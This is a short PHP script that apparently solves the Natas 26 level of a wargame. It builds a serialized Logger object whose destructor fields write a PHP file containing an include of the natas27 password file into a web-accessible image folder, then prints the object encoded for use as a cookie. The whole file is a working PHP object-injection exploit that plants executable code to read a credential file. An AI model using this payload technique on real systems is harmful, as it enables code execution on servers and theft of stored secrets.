<?php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;
    
    function __construct($file){
	$this->exitMsg = "natas27:<? include '/etc/natas_webpass/natas27'; ?>";
	$this->logFile = "img/NlP6TEsjSEMY5D.php";
    }
    function log($msg){
	;
    }
    function __destruct(){
	;
    }
}
$payload = new Logger("NlP6TEsjSEMY5D");

echo urlencode(base64_encode(serialize($payload)));
?>
